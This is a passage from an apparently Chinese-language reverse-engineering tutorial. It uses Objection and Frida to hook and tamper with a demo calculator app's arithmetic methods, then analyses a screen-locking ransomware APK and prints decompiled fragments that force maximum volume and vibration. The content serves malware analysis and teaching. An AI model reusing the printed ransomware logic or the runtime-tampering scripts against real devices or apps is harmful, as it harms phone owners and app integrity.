com.example.junior.CalculatorActivity.onCreate(android.os.Bundle)</span><br><span class="line">public void com.example.junior.CalculatorActivity.onClick(android.view.View)</span><br><span class="line"></span><br><span class="line">Found 4 method(s)</span><br></pre></td></tr></table></figure><h3 id="calculate"><a href="#calculate" class="headerlink" title="calculate()"></a>calculate()</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private boolean caculate() &#123;</span><br><span class="line">    if (operator.equals(&quot;＋&quot;)) &#123; &#x2F;&#x2F; 当前是相加运算</span><br><span class="line">        result &#x3D; String.valueOf(Arith.add(firstNum, nextNum));</span><br><span class="line">    &#125; else if (operator.equals(&quot;－&quot;)) &#123; &#x2F;&#x2F; 当前是相减运算</span><br><span class="line">        result &#x3D; String.valueOf(Arith.sub(firstNum, nextNum));</span><br><span class="line">    &#125; else if (operator.equals(&quot;×&quot;)) &#123; &#x2F;&#x2F; 当前是相乘运算</span><br><span class="line">        result &#x3D; String.valueOf(Arith.mul(firstNum, nextNum));</span><br><span class="line">    &#125; else if (operator.equals(&quot;÷&quot;)) &#123; &#x2F;&#x2F; 当前是相除运算</span><br><span class="line">        if (Double.parseDouble(nextNum) &#x3D;&#x3D; 0) &#123; &#x2F;&#x2F; 发现被除数是0</span><br><span class="line">            &#x2F;&#x2F; 被除数为0，要弹窗提示用户</span><br><span class="line">            Toast.makeText(this, &quot;被除数不能为零&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#x2F;&#x2F; 返回false表示运算失败</span><br><span class="line">            return false;</span><br><span class="line">        &#125; else &#123; &#x2F;&#x2F; 被除数非0，则进行正常的除法运算</span><br><span class="line">            result &#x3D; String.valueOf(Arith.div(firstNum, nextNum));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; 把运算结果打印到日志中</span><br><span class="line">    Log.d(TAG, &quot;result&#x3D;&quot; + result);</span><br><span class="line">    firstNum &#x3D; result;</span><br><span class="line">    nextNum &#x3D; &quot;&quot;;</span><br><span class="line">    &#x2F;&#x2F; 返回true表示运算成功</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个函数中对<code>减法</code>的处理是调用<code>Arith.sub</code>函数实现的 我们通常使用objeciton来获取一个应用在内存中的所有类</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hooking list classes</span><br><span class="line">com.example.junior on (google: 6.0.1) [usb] # android hooking list class_methods com.example.junior.util.Arith</span><br><span class="line">public static java.lang.String com.example.junior.util.Arith.add(double,double)</span><br><span class="line">public static java.lang.String com.example.junior.util.Arith.add(java.lang.String,java.lang.String)</span><br><span class="line">public static java.lang.String com.example.junior.util.Arith.div(double,double)</span><br><span class="line">public static java.lang.String com.example.junior.util.Arith.div(double,double,int)</span><br><span class="line">public static java.lang.String com.example.junior.util.Arith.div(java.lang.String,java.lang.String)</span><br><span class="line">public static java.lang.String com.example.junior.util.Arith.div(java.lang.String,java.lang.String,int)</span><br><span class="line">public static java.lang.String com.example.junior.util.Arith.mul(double,double)</span><br><span class="line">public static java.lang.String com.example.junior.util.Arith.mul(java.lang.String,java.lang.String)</span><br><span class="line">public static java.lang.String com.example.junior.util.Arith.round(double,int)</span><br><span class="line">public static java.lang.String com.example.junior.util.Arith.sub(double,double)</span><br><span class="line">public static java.lang.String com.example.junior.util.Arith.sub(java.lang.String,java.lang.String)</span><br><span class="line"></span><br><span class="line">Found 11 method(s)</span><br></pre></td></tr></table></figure><p>Ps: objection使用 android hooking list classes 缓存太大时可以使用如下方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">删除~&#x2F;.objection&#x2F;objection.log</span><br><span class="line">重新加载，调用在cat 即可</span><br><span class="line">╰─$ cat ~&#x2F;.objection&#x2F;objection.log | grep com.example.junior</span><br><span class="line">com.example.junior.CalculatorActivity</span><br><span class="line">com.example.junior.MainActivity</span><br><span class="line">com.example.junior.util.Arith</span><br></pre></td></tr></table></figure><h3 id="Util-Arith"><a href="#Util-Arith" class="headerlink" title="Util.Arith()"></a>Util.Arith()</h3><p>在内存中确定<code>util.Arith()</code> 函数后，便可以直接对这个函数进行hook</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.example.junior on (Android: 6.0.1) [usb] # android hooking watch class_method com.example.junior.util.Arith.sub --dump-args --</span><br><span class="line">dump-backtrace --dump-return</span><br><span class="line">(agent) Attempting to watch class com.example.junior.util.Arith and method sub.</span><br><span class="line">(agent) Hooking com.example.junior.util.Arith.sub(double, double)</span><br><span class="line">(agent) Hooking com.example.junior.util.Arith.sub(java.lang.String, java.lang.String)</span><br><span class="line">(agent) Registering job gj9zcimwkem. Type: watch-method for: com.example.junior.util.Arith.sub</span><br></pre></td></tr></table></figure><p>之后在计算器中随机进行减法操作</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230128163238577.png" alt="image-20230128163238577" style="zoom:50%;" div align="center/"><p>在objection中已经hook到<code>util.Arith()</code>函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.example.junior on (Android: 6.0.1) [usb] # (agent) [gj9zcimwkem] Called com.example.junior.util.Arith.sub(java.lang.String, java.lang.String)</span><br><span class="line">(agent) [gj9zcimwkem] Arguments com.example.junior.util.Arith.sub(12, 5)</span><br><span class="line">(agent) [gj9zcimwkem] Return Value: 7</span><br></pre></td></tr></table></figure><p>对所有运算函数进行hook</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.example.junior on (Android: 6.0.1) [usb] # jobs list</span><br><span class="line">Job ID       Hooks  Type</span><br><span class="line">-----------  -----  ---------------------------------------------------</span><br><span class="line">gj9zcimwkem      2  watch-method for: com.example.junior.util.Arith.sub</span><br><span class="line">7lyewxvtoip      2  watch-method for: com.example.junior.util.Arith.add</span><br><span class="line">hsdvh65digm      2  watch-method for: com.example.junior.util.Arith.mul</span><br><span class="line">i5opzx0y42e      4  watch-method for: com.example.junior.util.Arith.div</span><br></pre></td></tr></table></figure><p>同时编写frida脚本进行Hook</p><h3 id="hook-js"><a href="#hook-js" class="headerlink" title="hook.js"></a>hook.js</h3><p><strong>frida -F -l hook.js</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function main()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var Arith &#x3D; Java.use(&#39;com.example.junior.util.Arith&#39;)</span><br><span class="line">        Arith.sub.implementation &#x3D; function(str,str2)&#123;</span><br><span class="line">            var result &#x3D; this.sub(str,str2)</span><br><span class="line">            console.log(&quot;str,str2,result&#x3D;&gt;&quot;, str,str2,result)</span><br><span class="line">            &#x2F;&#x2F;return result</span><br><span class="line">            &#x2F;&#x2F;打印Java调用栈</span><br><span class="line">            console.log(Java.use(&quot;android.util.Log&quot;).getStackTraceString(Java.use(&quot;java.lang.Throwable&quot;).$new()))</span><br><span class="line">            return result</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure><p>发现存在报错</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Android Emulator 5554::com.example.junior]-&gt; Error: sub(): has more than one overload, use .overload(&lt;signature&gt;) to choose from:</span><br><span class="line">.overload(&#39;java.lang.String&#39;, &#39;java.lang.String&#39;)</span><br><span class="line">.overload(&#39;double&#39;, &#39;double&#39;)</span><br><span class="line">    at throwOverloadError (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:1020)</span><br><span class="line">    at frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;class-factory.js:707</span><br><span class="line">    at &#x2F;hook.js:11</span><br><span class="line">    at frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;lib&#x2F;vm.js:11</span><br><span class="line">    at E (frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;index.js:346)</span><br><span class="line">    at frida&#x2F;node_modules&#x2F;frida-java-bridge&#x2F;index.js:332</span><br><span class="line">    at input:1</span><br></pre></td></tr></table></figure><p>我们根据之前Objection的结果</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.example.junior on (Android: 6.0.1) [usb] # (agent) [gj9zcimwkem] Called com.example.junior.util.Arith.sub(java.lang.String, java.lang.String)</span><br></pre></td></tr></table></figure><p>​                              </p><p><strong>将</strong>overload(‘java.lang.String’,’java.lang.String’)添加到代码中即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function main()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var Arith &#x3D; Java.use(&#39;com.example.junior.util.Arith&#39;)</span><br><span class="line">        Arith.sub.overload(&#39;java.lang.String&#39;,&#39;java.lang.String&#39;).implementation &#x3D; function(str,str2)&#123;</span><br><span class="line">            var result &#x3D; this.sub(str,str2)</span><br><span class="line">            console.log(&quot;str,str2,result&#x3D;&gt;&quot;, str,str2,result)</span><br><span class="line">            &#x2F;&#x2F;return result</span><br><span class="line">            &#x2F;&#x2F;打印Java调用栈</span><br><span class="line">            console.log(Java.use(&quot;android.util.Log&quot;).getStackTraceString(Java.use(&quot;java.lang.Throwable&quot;).$new()))</span><br><span class="line">            return result</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230128165354224.png" alt="image-20230128165354224"></p><p>使用脚本对参数进行修改，将第二个参数修改为123</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function main()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var Arith &#x3D; Java.use(&#39;com.example.junior.util.Arith&#39;)</span><br><span class="line">        Arith.sub.overload(&#39;java.lang.String&#39;,&#39;java.lang.String&#39;).implementation &#x3D; function(str,str2)&#123;</span><br><span class="line">            var result &#x3D; this.sub(str,&quot;123&quot;)</span><br><span class="line">            console.log(&quot;str,str2,result&#x3D;&gt;&quot;, str,str2,result)</span><br><span class="line">            &#x2F;&#x2F;return result</span><br><span class="line">            &#x2F;&#x2F;打印Java调用栈</span><br><span class="line">            console.log(Java.use(&quot;android.util.Log&quot;).getStackTraceString(Java.use(&quot;java.lang.Throwable&quot;).$new()))</span><br><span class="line">            return result</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230128165529840.png" alt="image-20230128165529840"></p><p> Ps: 这里123的直接传递实际上是不对的，正确的传入字符串参数的方式应该如夏，也就是使用Java中相应字符串类新建一个字符串实例传参</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var JavaString &#x3D; Java.use(&quot;java.lang.String&quot;)</span><br><span class="line">var result &#x3D; this.sub(str, JavaString.$new(&#39;123&#39;)))</span><br></pre></td></tr></table></figure><blockquote><p>这里我们去构造的新的参数的类型是根据实际函数的第二个参数类型为java.lang.String 决定的。之所以用this.sub(str,”123”)的方式传递字符串时没有报错，是因为Frida本身对JavaScript的字符串进行了转换，将JavaScript的字符串在内部转换位了Java的String类型。如果是复杂的参数，就一定要先调用Java.use() 这个APi去获取对应的类对象，然后通过$new()函数去构造一个新的参数</p></blockquote><p>call.js</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function callSub()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var Arith &#x3D; Java.use(&#39;com.example.junior.util.Arith&#39;)</span><br><span class="line">        var JavaString &#x3D; Java.use(&#39;java.lang.String&#39;)</span><br><span class="line">        var result &#x3D; Arith.sub(JavaString.$new(&quot;123&quot;),JavaString.$new(&quot;111&quot;))</span><br><span class="line">        console.log(&quot;123 - 111 &#x3D; &quot;, result)  </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Android Emulator 5554::com.example.junior]-&gt; callSub()</span><br><span class="line">123 - 111 &#x3D;  12</span><br></pre></td></tr></table></figure><h3 id="Rpc调用"><a href="#Rpc调用" class="headerlink" title="Rpc调用"></a>Rpc调用</h3><p>call.js</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function CallSub(a,b)&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var Arith &#x3D; Java.use(&#39;com.example.junior.util.Arith&#39;)</span><br><span class="line">        var JavaString &#x3D; Java.use(&#39;java.lang.String&#39;)</span><br><span class="line">        var result &#x3D; Arith.sub(JavaString.$new(a),JavaString.$new(b))</span><br><span class="line">        console.log(a,&quot;-&quot;,b,&quot;&#x3D;&quot;,result)  </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rpc.exports &#x3D; &#123;</span><br><span class="line">    sub : CallSub</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">rpc.exports &#x3D; &#123;</span><br><span class="line">    sub: function CallSub(a,b)&#123;</span><br><span class="line">        Java.perform(function()&#123;</span><br><span class="line">            var Arith &#x3D; Java.use(&#39;com.example.junior.util.Arith&#39;)</span><br><span class="line">            var JavaString &#x3D; Java.use(&#39;java.lang.String&#39;)</span><br><span class="line">            var result  &#x3D; Arith.sub(JavaString.$new(a),JavaString.$new(b))</span><br><span class="line">            console.log(a,&quot;-&quot;,b,&quot;&#x3D;&quot;,result) &#x2F;&#x2F; 最终修改为 send(a,&quot;-&quot;,b,&quot;&#x3D;&quot;,result)</span><br><span class="line">        &#125;)</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure><p>loader.py</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from distutils import command</span><br><span class="line">import frida, sys</span><br><span class="line"></span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#39;type&#39;] &#x3D;&#x3D; &#39;send&#39;:</span><br><span class="line">        print(&quot;[*] &#123;0&#125;&quot;.format(message[&#39;payload&#39;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line">device &#x3D; frida.get_usb_device()</span><br><span class="line"></span><br><span class="line"># frida-server -l 0.0.0.0:1</span><br><span class="line"># device &#x3D; frida.get_devices_manager().add_remote_device(&#39;192.168.50.129:1234&#39;)</span><br><span class="line"></span><br><span class="line">process &#x3D; device.attach(&#39;com.example.junior&#39;)</span><br><span class="line"></span><br><span class="line">with open(&#39;call.js&#39;) as f:</span><br><span class="line">    jscode &#x3D; f.read()</span><br><span class="line"></span><br><span class="line">script &#x3D; process.create_script(jscode)</span><br><span class="line"></span><br><span class="line">script.on(&#39;message&#39;, on_message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">for i in range(20,30):</span><br><span class="line">    for j in range(0,10):</span><br><span class="line">        script.exports.sub(str(i),str(j))</span><br></pre></td></tr></table></figure><h3 id="调用结果"><a href="#调用结果" class="headerlink" title="调用结果"></a>调用结果</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 loader.py                                                                            1 ↵</span><br><span class="line">20 - 0 &#x3D; 20</span><br><span class="line">20 - 1 &#x3D; 19</span><br><span class="line">20 - 2 &#x3D; 18</span><br><span class="line">20 - 3 &#x3D; 17</span><br><span class="line">20 - 4 &#x3D; 16</span><br><span class="line">20 - 5 &#x3D; 15</span><br><span class="line">20 - 6 &#x3D; 14</span><br><span class="line">20 - 7 &#x3D; 13</span><br><span class="line">20 - 8 &#x3D; 12</span><br><span class="line">20 - 9 &#x3D; 11</span><br><span class="line">21 - 0 &#x3D; 21</span><br><span class="line">21 - 1 &#x3D; 20</span><br><span class="line">21 - 2 &#x3D; 19</span><br><span class="line">21 - 3 &#x3D; 18</span><br><span class="line">21 - 4 &#x3D; 17</span><br><span class="line">21 - 5 &#x3D; 16</span><br><span class="line">21 - 6 &#x3D; 15</span><br><span class="line">21 - 7 &#x3D; 14</span><br></pre></td></tr></table></figure><h2 id="yry-1-0-apk"><a href="#yry-1-0-apk" class="headerlink" title="yry-1.0.apk"></a>yry-1.0.apk</h2><blockquote><p>该APK为恶意锁机勒索病毒，建议在沙箱，模拟器或者在无人情况进行学习。主要恶意行为如下</p><ul><li>背景图片和背景音乐极其不健康，音量调到最大，循环播放，且无法关闭</li><li>屏幕被锁定，无法进行任何操作</li><li>USB断开</li><li>手机持续震动，并存在自启动服务</li></ul></blockquote><p>Ps: 由于会断开USB连接,这边推荐3钟方式进行测试</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.使用WIFI ADB在手机上开启远程ADB服务进行连接</span><br><span class="line">2.使用模拟器进行测试</span><br><span class="line">3.修改Smali代码，重打包   &#x2F;&#x2F;apktool编译重打包 ,keytool制作密钥库,apksigner对apk签名</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129083855272.png" alt="image-20230129083855272"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129083920125.png" alt="image-20230129083920125"></p><p>安装后使用objection连接应用，静态分析文件，并遍历services服务。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.shimeng.qq2693533893 on (Android: 6.0.1) [usb] # android hooking list services</span><br><span class="line">com.shimeng.qq2693533893.MyServiceOne</span><br><span class="line"></span><br><span class="line">Found 1 classes</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package com.shimeng.qq2693533893;</span><br><span class="line"></span><br><span class="line">import android.app.Activity;</span><br><span class="line">import android.content.Intent;</span><br><span class="line">import android.os.Bundle;</span><br><span class="line"></span><br><span class="line">&#x2F;* loaded from: classes.dex *&#x2F;</span><br><span class="line">public class MainActivity extends Activity &#123;</span><br><span class="line">    @Override &#x2F;&#x2F; android.app.Activity</span><br><span class="line">    protected void onCreate(Bundle bundle) &#123;</span><br><span class="line">        LogCatBroadcaster.start(this);</span><br><span class="line">        super.onCreate(bundle);</span><br><span class="line">        try &#123;</span><br><span class="line">            startService(new Intent(this, Class.forName(&quot;com.shimeng.qq2693533893.MyServiceOne&quot;)));</span><br><span class="line">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">            throw new NoClassDefFoundError(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>静态分析后，我们初步确定这个App的核心方法应该在MyserviceOne服务中，但是并不确定具体是哪个函数，所以直接使用命令Hook整个类。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hooking watch class com.shimeng.qq2693533893.MyServiceOne --dump-args --dump-backtrace --dump-return</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129084728970.png" alt="image-20230129084728970"></p><p>使用objection查看对应类的函数方法。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.shimeng.qq2693533893 on (Android: 6.0.1) [usb] # plugin wallbreaker classdump com.shimeng.qq2693533893.MyServiceOne --fullname</span><br><span class="line"></span><br><span class="line">package com.shimeng.qq2693533893</span><br><span class="line"></span><br><span class="line">class MyServiceOne &#123;</span><br><span class="line"></span><br><span class="line">&#x2F;* static fields *&#x2F;</span><br><span class="line">static java.lang.String KEY; &#x3D;&gt; 颜如玉QQ：2693533893</span><br><span class="line">static java.lang.String KEYIV; &#x3D;&gt; EDC9381060B95338</span><br><span class="line">static boolean hexcase; &#x3D;&gt; false</span><br><span class="line">static java.lang.String 月如意; &#x3D;&gt; 8D4FF507DCDA63C201EB8B99D4170900</span><br><span class="line">static java.lang.String 破解死全家; &#x3D;&gt; 23543dfggeelysdafaqj23ou89ZXcj@#$@#$#@KJdjklj;D..&#x2F;dSF.,</span><br><span class="line">static com.shimeng.颜如玉.颜如玉QQ2693533893 破解死妈; &#x3D;&gt; [0x200c72]: com.shimeng.颜如玉.颜如玉QQ2693533893@59ac573</span><br><span class="line">static java.lang.String 诗梦MD5; &#x3D;&gt; 9DDEB743E935CE399F1DFAF080775366</span><br><span class="line"></span><br><span class="line">&#x2F;* instance fields *&#x2F;</span><br><span class="line">int B;</span><br><span class="line">int L;</span><br><span class="line">android.os.Handler hand2;</span><br><span class="line">android.os.Handler hand3;</span><br><span class="line">java.lang.Runnable runn2;</span><br><span class="line">java.lang.Runnable runn3;</span><br><span class="line">com.shimeng.qq2693533893.FloatViewUtil util;</span><br><span class="line">android.view.View v;</span><br><span class="line">java.lang.String 坐等前往世界的尽头的小船;</span><br><span class="line">android.widget.TextView 解锁;</span><br><span class="line"></span><br><span class="line">&#x2F;* constructor methods *&#x2F;</span><br><span class="line">void MyServiceOne();</span><br><span class="line"></span><br><span class="line">&#x2F;* static methods *&#x2F;</span><br><span class="line">static java.lang.String SHA1(java.util.Map);</span><br><span class="line">static void access$1000014(com.shimeng.qq2693533893.MyServiceOne);</span><br><span class="line">static com.shimeng.qq2693533893.FloatViewUtil access$L1000000(com.shimeng.qq2693533893.MyServiceOne);</span><br><span class="line">static boolean access$L1000002();</span><br><span class="line">static java.lang.String access$L1000003();</span><br><span class="line">static java.lang.String access$L1000004();</span><br><span class="line">static android.os.Handler access$L1000018(com.shimeng.qq2693533893.MyServiceOne);</span><br><span class="line">static android.os.Handler access$L1000021(com.shimeng.qq2693533893.MyServiceOne);</span><br><span class="line">static java.lang.Runnable access$L1000023(com.shimeng.qq2693533893.MyServiceOne);</span><br><span class="line">static void access$S1000000(com.shimeng.qq2693533893.MyServiceOne, com.shimeng.qq2693533893.FloatViewUtil);</span><br><span class="line">static void access$S1000002(boolean);</span><br><span class="line">static void access$S1000003(java.lang.String);</span><br><span class="line">static void access$S1000004(java.lang.String);</span><br><span class="line">static void access$S1000018(com.shimeng.qq2693533893.MyServiceOne, android.os.Handler);</span><br><span class="line">static void access$S1000021(com.shimeng.qq2693533893.MyServiceOne, android.os.Handler);</span><br><span class="line">static void access$S1000023(com.shimeng.qq2693533893.MyServiceOne, java.lang.Runnable);</span><br><span class="line">static java.lang.String getOrderByLexicographic(java.util.Map);</span><br><span class="line">static java.util.List getParamsName(java.util.Map);</span><br><span class="line">static java.util.List lexicographicOrder(java.util.List);</span><br><span class="line">static java.lang.String splitParams(java.util.List, java.util.Map);</span><br><span class="line">static java.lang.String 颜如玉(java.lang.String);</span><br><span class="line"></span><br><span class="line">&#x2F;* instance methods *&#x2F;</span><br><span class="line">android.os.IBinder onBind(android.content.Intent);</span><br><span class="line">void onCreate();</span><br><span class="line">void onDestroy();</span><br><span class="line">void onRequestPermissionsResult(int, java.lang.String[], I[]);</span><br><span class="line">java.lang.String smsOpera(java.lang.String);</span><br><span class="line">java.lang.String 独自走在孤独的雨中(java.lang.String);</span><br><span class="line">void 诗梦();</span><br><span class="line">void sm();</span><br><span class="line">void sm2();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现程序一直在调用<code>access$L1000018</code> ,查找该函数并查询调用情况如下。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hooking watch class_method com.shimeng.qq2693533893.MyServiceOne.access$L1000018</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.shimeng.qq2693533893 on (Android: 6.0.1) [usb] # (agent) [1s0p2cg6mvi] Called com.shimeng.qq2693533893.MyServiceOne.access$L1000018(com.shimeng.qq2693533893.MyServiceOne)</span><br><span class="line">(agent) [1s0p2cg6mvi] Backtrace:</span><br><span class="line">com.shimeng.qq2693533893.MyServiceOne.access$L1000018(Native Method)</span><br><span class="line">        com.shimeng.qq2693533893.MyServiceOne$100000007.run(MyServiceOne.java:309)</span><br><span class="line">android.os.Handler.handleCallback(Handler.java:739)</span><br><span class="line">android.os.Handler.dispatchMessage(Handler.java:95)</span><br><span class="line">android.os.Looper.loop(Looper.java:148)</span><br><span class="line">android.app.ActivityThread.main(ActivityThread.java:5647)</span><br><span class="line">java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:745)</span><br><span class="line">com.android.internal.os.ZygoteInit.main(ZygoteInit.java:635)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129092550240.png" alt="image-20230129092550240"></p><p>hook该内部类并打印调用栈，发现调用栈上层反复调用com.shimeng.qq2693533893.MyServiceOne.access$100000007.run</p><p>同时在JEB中查看调用链，确实是在100000007中将音量调到最大，循环播放。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129085423767.png" alt="image-20230129085423767"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class 100000007 implements Runnable &#123;</span><br><span class="line">    private final MyServiceOne this$0;</span><br><span class="line"></span><br><span class="line">    static MyServiceOne access$0(100000007 arg4) &#123;</span><br><span class="line">        return MyServiceOne.this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void run() &#123;</span><br><span class="line">        MyServiceOne.this.hand2.postDelayed(this, 1800L);</span><br><span class="line">        AudioManager v1 &#x3D; (AudioManager)MyServiceOne.this.getSystemService(&quot;audio&quot;);</span><br><span class="line">        v1.setStreamVolume(3, v1.getStreamMaxVolume(3), 4);</span><br><span class="line">        v1.getStreamMaxVolume(0);</span><br><span class="line">        v1.getStreamVolume(0);</span><br><span class="line">        v1.getStreamVolume(0);</span><br><span class="line">        ((Vibrator)MyServiceOne.this.getApplication().getSystemService(&quot;vibrator&quot;)).vibrate(new long[]&#123;100L, 1500L, 100L, 1500L&#125;, -1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>一。AudioManager即音频管理器， 用于管理android系统各种音频类型 （包括系统声音，通话，铃声，音乐，闹铃）的音量设置。 还可以使用它来设置“耳机插入时”的广播接收器 （action:android.intent.action.MEDIABUTTON）。 </p><p>二。MediaPlayer用于播放音频， android api中提供了该工具， 播放过程中可以控制音频的各种状态， 具体使用比较简单。 可以从资源文件中播放，从文件系统播放，从网络播放等方式。 具体包名：android.media.AudioManager</p></blockquote><p>我们来hook该类,在循环调用该函数，调整声音大小。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.shimeng.qq2693533893 on (Android: 6.0.1) [usb] # (agent) [kbvime5ddss] Called android.media.AudioManager.getStreamMaxVolume(int)</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getService()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.setStreamVolume(int, int, int)</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getContext()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getContext()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getStreamMaxVolume(int)</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getService()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getStreamVolume(int)</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getService()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getStreamVolume(int)</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getService()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getStreamMaxVolume(int)</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getService()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.setStreamVolume(int, int, int)</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getContext()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getContext()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getStreamMaxVolume(int)</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getService()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getStreamVolume(int)</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getService()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getStreamVolume(int)</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getService()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getStreamMaxVolume(int)</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getService()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.setStreamVolume(int, int, int)</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getContext()</span><br><span class="line">(agent) [kbvime5ddss] Called android.media.AudioManager.getContext()</span><br></pre></td></tr></table></figure><p>setStreamVolume (int streamType, int index, int flags) 。</p><p>函数具体使用如下。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setStreamVolume (int streamType, int index, int flags)  </span><br><span class="line">第一个参数（需要调整音量的类型），可以是：</span><br><span class="line">STREAM_ALARM 警报  </span><br><span class="line">STREAM_MUSIC 音乐回放即媒体音量  </span><br><span class="line">STREAM_NOTIFICATION 窗口顶部状态栏Notification</span><br><span class="line">STREAM_RING 铃声  </span><br><span class="line">STREAM_SYSTEM 系统  </span><br><span class="line">STREAM_VOICE_CALL 通话  </span><br><span class="line">STREAM_DTMF 双音多频</span><br><span class="line"></span><br><span class="line">第二个参数就是音量的int值</span><br><span 